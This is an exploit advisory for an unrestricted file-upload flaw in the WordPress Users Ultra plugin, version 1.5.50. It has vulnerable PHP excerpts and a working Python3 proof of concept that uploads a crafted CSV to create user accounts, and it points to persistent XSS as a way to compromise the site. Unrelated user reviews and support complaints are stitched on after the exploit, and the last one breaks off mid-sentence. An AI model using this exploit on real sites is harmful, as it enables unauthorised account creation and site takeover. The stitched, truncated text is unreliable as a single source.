# WordPress Users Ultra Plugin [Unrestricted File Upload]

```
* Exploit Title: WordPress Users Ultra Plugin [Unrestricted File Upload]
* Discovery Date: 2015/10/27
* Public Disclosure Date: 2015/12/01
* Exploit Author: Panagiotis Vagenas
* Contact: <https://twitter.com/panVagenas>
* Vendor Homepage: <http://usersultra.com>
* Software Link: <https://wordpress.org/plugins/users-ultra/>
* Version: 1.5.50
* Tested on: WordPress 4.3.1
* Category: webapps

Description
================================================================================

WordPress plugin `Users Ultra Plugin` suffers for an unrestricted file upload vulnerability.

Any user (registered or not) can exploit a misbehavior of the plugin in order to upload csv files to the infected
website. Although the plugin checks file extension using an extensions white-list (in this case only csv files are
white-listed), no other checks (mime, size etc) are taking place. This alone can expose the infected website to a
variety of attacks, please see [OWASP Unrestricted File
Upload](<https://www.owasp.org/index.php/Unrestricted_File_Upload>) to get an idea.

Details
================================================================================

The plugin workflow that could allow a malicious user to exploit this misbehavior is as follows:

1. Upon initialization of the plugin (anytime if it is activated) an instance of `XooUserUser` class is created
2. In the constructor of `XooUserUser` class a check for POST variable `uultra-form-cvs-form-conf` is taking place
    file `wp-content/plugins/users-ultra/xooclasses/xoo.userultra.user.php` lines 19-23
    ```php
    if (isset($_POST['uultra-form-cvs-form-conf']))
    {
            /* Let's Update the Profile */
            $this->process_cvs($_FILES);
    }
    ```
3. Assuming the POST variable `uultra-form-cvs-form-conf` has been set in the request, the method
`XooUserUser::process_cvs()` is called.
4. `XooUserUser::process_cvs()` method process every file in $_FILES super-global by only making a check if the file
has a `csv` extension

In addition we mark the following points:

1. A malicious user can create and activate user accounts by exploiting this vulnerability if
`$_POST["uultra-activate-account"]` is set to `active`
2. A welcome email is send if `$_POST["uultra-send-welcome-email"]` is set to 1
3. The csv files uploaded to the server are stored in a directory (`wp-content/usersultramedia/import` by default)
accessible by anyone
4. Any additional columns present in the csv file are stored in `usermeta`
5. No sanitization for values in csv file can easily lead to a Persistent XSS attack, so an attacker can compromise the
whole site

PoC
================================================================================

The following Python3 script forms a csv file and uploads it to a site

```python3
#!/usr/bin/python3
import requests
import csv
import tempfile

url = '[http://example.com/'](http://example.com/%26apos);

postData = {
    'uultra-form-cvs-form-conf': 1,
    'uultra-send-welcome-email': 1,
    'uultra-activate-account': 'pending'
}

csvFileHeader = ['user name', 'email', 'display name', 'registration date', 'first name', 'last name', 'age', 'country']
csvFileRow = ['userName', 'email () example com', 'User Name', '1/1/1', 'User', 'Name', '100', 'IO']

csvFile = tempfile.NamedTemporaryFile(mode='a+t', suffix='.csv')

wr = csv.writer(csvFile, quoting=csv.QUOTE_ALL, delimiter=',')

wr.writerow(csvFileHeader)
wr.writerow(csvFileRow)

csvFile.seek(0)

files = {'file.csv': csvFile}

r = requests.post(url, data=postData, files=files)

exit(0)
```

When I am logged out and click on ”see profile” ( profile of another member ) tells me to login/sign in, which is fine, even tho I might not want to have it set it up that way.
I login and I click on a profile ( again, not my profile) and I am redirected to my profile, therefore, I can not see members profiles, which again, I actually don’t need members to not see other members profiles.
I would appreciate a solution to this please.

In October 2020, we tried out the free version of Users Ultra. A pre-sales enquiry we made was answered within a few hours, so we were assumed that there was a robust support mechanism behind the software. We purchased the Pro version on the strength of the answer to our pre-sales question.
However, once we had purchased and installed the Pro version of Users Ultra, we found that it did not function correctly on our site. We therefore requested assistance by logging a technical support ticket with Users Ultra. Our support ticket went unanswered and so six days later we resubmitted it. This support request too went unanswered and so we requested a refund under the terms of their 30-day money back guarantee. Perhaps not surprisingly, this request was ignored as well.
We now had three open tickets on our Users Ultra account and, because it turns out that this is the maximum number of open requests you can have, we could no longer contact them through this route. We tried emailing directly to the technician that had given us the initial pre-sales support but, again, heard nothing back.
Fortunately, we had taken screenshots of the support section of our Users Ultra account showing the dates of our last three support tickets (those logged since paying Users Ultra and including the refund request) and that they were all still showing as “Unassigned”. As we had used a credit card to make the purchase, we were able to send those screenshots to our card supplier as proof of the lack of support and claim our money back.

We paid for a PRO version and now 16 months later we can’t get ANY support. Have an open ticket for 3 weeks now and no response. We simply updated our WP to latest and stuff is broken now.
I’d be happy to rereview this plugin if anyone would ever contact me because we like the functionality, but if I can’t get support my site is down

Purchased their ultimate package. Does not work, no support or response after trying to get it to work for over a year. I would give it zero stars if I could.

Thank you for free use this plugin.
Please fix it compatibily with WP5.5/JQuery migrate. The issue is:
